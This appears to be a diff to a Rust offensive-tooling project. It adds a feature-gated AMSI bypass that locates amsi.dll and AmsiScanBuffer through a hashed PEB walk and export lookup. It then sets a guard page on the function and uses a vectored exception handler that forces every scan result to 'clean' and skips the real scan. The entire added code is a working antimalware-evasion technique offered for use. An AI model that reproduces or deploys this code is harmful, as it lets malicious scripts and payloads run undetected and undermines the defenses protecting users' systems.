@@ -281,3 +281,280 @@ pub fn patch_amsi_hwbp() -> Result<(), i32> {
         Ok(())
     }
 }
+
+// =======================================================================================================
+// AMSI EVASION: Page Guard Exceptions
+// =======================================================================================================
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+use std::ffi::{CStr, c_void};
+#[cfg(feature = "EvasionAMSIPageGuard")]
+use std::mem::{offset_of, size_of};
+#[cfg(feature = "EvasionAMSIPageGuard")]
+use std::ptr::null_mut;
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+use windows_sys::Win32::Foundation::{HANDLE, STATUS_GUARD_PAGE_VIOLATION, STATUS_SINGLE_STEP};
+#[cfg(feature = "EvasionAMSIPageGuard")]
+use windows_sys::Win32::System::Diagnostics::Debug::{
+    EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS,
+    IMAGE_NT_HEADERS64,
+};
+#[cfg(feature = "EvasionAMSIPageGuard")]
+use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, PAGE_GUARD};
+#[cfg(feature = "EvasionAMSIPageGuard")]
+use windows_sys::Win32::System::SystemServices::{
+    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
+};
+#[cfg(feature = "EvasionAMSIPageGuard")]
+use windows_sys::Win32::System::Threading::PEB;
+#[cfg(feature = "EvasionAMSIPageGuard")]
+use windows_sys::Win32::System::WindowsProgramming::LDR_DATA_TABLE_ENTRY;
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+type AMSI_RESULT = u32;
+#[cfg(feature = "EvasionAMSIPageGuard")]
+const AMSI_RESULT_CLEAN: AMSI_RESULT = 0;
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+const fn c_hash(s: &str) -> u32 {
+    let mut hash = 0x811c9dc5u32;
+    let bytes = s.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        hash ^= bytes[i] as u32;
+        hash = hash.wrapping_mul(0x01000193);
+        i += 1;
+    }
+    hash
+}
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+const fn w_hash(s: &[u16]) -> u32 {
+    let mut hash = 0x811c9dc5u32;
+    let mut i = 0;
+    while i < s.len() {
+        hash ^= s[i] as u32;
+        hash = hash.wrapping_mul(0x01000193);
+        i += 1;
+    }
+    hash
+}
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+const AMSI_DLL_HASH: u32 = w_hash(&[
+    'a' as u16, 'm' as u16, 's' as u16, 'i' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16,
+]);
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+const AMSI_SCAN_BUFFER_HASH: u32 = c_hash("AmsiScanBuffer");
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+type PVECTORED_EXCEPTION_HANDLER = extern "system" fn(*mut EXCEPTION_POINTERS) -> i32;
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+#[link(name = "ntdll")]
+unsafe extern "system" {
+    fn RtlAddVectoredExceptionHandler(First: u32, Handler: PVECTORED_EXCEPTION_HANDLER) -> *mut c_void;
+    fn RtlRemoveVectoredExceptionHandler(Handle: *mut c_void) -> u32;
+    fn NtProtectVirtualMemory(
+        ProcessHandle: HANDLE,
+        BaseAddress: *mut *mut c_void,
+        NumberOfBytesToProtect: *mut usize,
+        NewAccessProtection: u32,
+        OldAccessProtection: *mut u32,
+    ) -> i32;
+}
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+#[allow(unused_assignments)]
+fn get_peb() -> *mut PEB {
+    unsafe {
+        let mut peb = null_mut::<PEB>();
+        core::arch::asm!(
+            "mov {0}, gs:[0x60]",
+            out(reg) peb,
+        );
+        peb
+    }
+}
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+fn find_module(module_hash: u32) -> Option<u64> {
+    unsafe {
+        let peb = get_peb();
+        if peb.is_null() {
+            return None;
+        }
+        let ldr = (*peb).Ldr;
+        if ldr.is_null() {
+            return None;
+        }
+        let list_head = &(*ldr).InMemoryOrderModuleList as *const _ as usize;
+        let mut link = (*ldr).InMemoryOrderModuleList.Flink;
+        while (link as usize) != list_head {
+            let entry = (link as usize - offset_of!(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks))
+                as *mut LDR_DATA_TABLE_ENTRY;
+            if entry.is_null() {
+                break;
+            }
+            let dll_base = (*entry).DllBase as u64;
+            let name = (*entry).FullDllName;
+            let name_len = name.Length as usize / 2;
+            let name_slice = if !name.Buffer.is_null() && name_len > 0 {
+                std::slice::from_raw_parts(name.Buffer, name_len)
+            } else {
+                &[]
+            };
+            let name_hash = w_hash(name_slice);
+            if name_hash == module_hash {
+                return Some(dll_base);
+            }
+            link = (*link).Flink;
+        }
+        None
+    }
+}
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+fn find_api(module_base: u64, api_hash: u32) -> Option<u64> {
+    let base_ptr = module_base as *mut u8;
+    
+    unsafe {
+        let dos_header = &*(base_ptr as *const IMAGE_DOS_HEADER);
+        if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
+            return None;
+        }
+        
+        let nt_offset = dos_header.e_lfanew as usize;
+        let nt_headers = &*((base_ptr.add(nt_offset)) as *const IMAGE_NT_HEADERS64);
+        
+        if nt_headers.Signature != IMAGE_NT_SIGNATURE {
+            return None;
+        }
+        
+        let export_rva = nt_headers.OptionalHeader.DataDirectory[0].VirtualAddress;
+        if export_rva == 0 {
+            return None;
+        }
+
+        let export_dir = &*((base_ptr.add(export_rva as usize)) as *const IMAGE_EXPORT_DIRECTORY);
+        let names = base_ptr.add(export_dir.AddressOfNames as usize) as *const u32;
+        let functions = base_ptr.add(export_dir.AddressOfFunctions as usize) as *const u32;
+        let ordinals = base_ptr.add(export_dir.AddressOfNameOrdinals as usize) as *const u16;
+
+        for i in 0..export_dir.NumberOfNames as usize {
+            let name_rva = *names.add(i);
+            let name_ptr = base_ptr.add(name_rva as usize) as *const i8;
+            let cstr = CStr::from_ptr(name_ptr);
+            if let Ok(name_str) = cstr.to_str() {
+                let name_hash = c_hash(name_str);
+                if name_hash == api_hash {
+                    let ordinal = *ordinals.add(i) as usize;
+                    let func_rva = *functions.add(ordinal) as u64;
+                    let api_addr = module_base + func_rva;
+                    return Some(api_addr);
+                }
+            }
+        }
+    }
+    None
+}
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+extern "system" fn vectored_exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
+    unsafe {
+        let exception_record = (*exception_info).ExceptionRecord;
+        let ex_code = (*exception_record).ExceptionCode;
+        let ex_addr = (*exception_record).ExceptionAddress as u64;
+
+        if ex_code == STATUS_GUARD_PAGE_VIOLATION {
+            let amsi_base = find_module(AMSI_DLL_HASH).unwrap_or(0);
+            if amsi_base == 0 {
+                return EXCEPTION_CONTINUE_SEARCH;
+            }
+            let p_amsi_scan_buffer = find_api(amsi_base, AMSI_SCAN_BUFFER_HASH).unwrap_or(0);
+            if p_amsi_scan_buffer == 0 {
+                return EXCEPTION_CONTINUE_SEARCH;
+            }
+
+            let ctx = (*exception_info).ContextRecord;
+
+            if ex_addr == p_amsi_scan_buffer {
+                let stack = (*ctx).Rsp as *mut *mut c_void;
+                let p_amsi_result = stack.add(6) as *mut AMSI_RESULT;
+                *p_amsi_result = AMSI_RESULT_CLEAN;
+                let ret_address = *stack;
+                (*ctx).Rsp += size_of::<*mut c_void>() as u64;
+                (*ctx).Rip = ret_address as u64;
+                (*ctx).Rax = 0; // S_OK
+                (*ctx).EFlags |= 0x100; // Trap flag
+                return EXCEPTION_CONTINUE_EXECUTION;
+            }
+            (*ctx).EFlags |= 0x100;
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+
+        if ex_code == STATUS_SINGLE_STEP {
+            let amsi_base = find_module(AMSI_DLL_HASH).unwrap_or(0);
+            if amsi_base != 0 {
+                let p_amsi_scan_buffer_addr =
+                    find_api(amsi_base, AMSI_SCAN_BUFFER_HASH).unwrap_or(0);
+                if p_amsi_scan_buffer_addr != 0 {
+                    let mut p_amsi_scan_buffer = p_amsi_scan_buffer_addr as *mut c_void;
+                    let mut region_size: usize = 1;
+                    let mut old_protect: u32 = 0;
+                    let status = NtProtectVirtualMemory(
+                        -1isize as HANDLE,
+                        &mut p_amsi_scan_buffer,
+                        &mut region_size,
+                        PAGE_EXECUTE_READ | PAGE_GUARD,
+                        &mut old_protect,
+                    );
+                    if status >= 0 {
+                        // Success
+                    }
+                }
+            }
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+        EXCEPTION_CONTINUE_SEARCH
+    }
+}
+
+#[cfg(feature = "EvasionAMSIPageGuard")]
+pub fn patch_amsi_page_guard() -> Result<(), &'static str> {
+    unsafe {
+        // Find amsi.dll
+        let amsi_base = find_module(AMSI_DLL_HASH).ok_or("")?;
+        
+        // Find AmsiScanBuffer
+        let p_amsi_scan_buffer = find_api(amsi_base, AMSI_SCAN_BUFFER_HASH)
+            .ok_or("")?;
+
+        // Add vectored exception handler
+        let h_vectored_exception_handler = RtlAddVectoredExceptionHandler(1, vectored_exception_handler);
+        if h_vectored_exception_handler.is_null() {
+            return Err("");
+        }
+
+        // Apply page guard
+        let mut p_func = p_amsi_scan_buffer as *mut c_void;
+        let mut number_of_bytes_to_protect: usize = 1;
+        let mut old_protect: u32 = 0;
+        let status = NtProtectVirtualMemory(
+            -1isize as HANDLE,
+            &mut p_func,
+            &mut number_of_bytes_to_protect,
+            PAGE_EXECUTE_READ | PAGE_GUARD,
+            &mut old_protect,
+        );
+        
+        if status < 0 {
+            RtlRemoveVectoredExceptionHandler(h_vectored_exception_handler);
+            return Err("");
+        }
+
+        Ok(())
+    }
+}
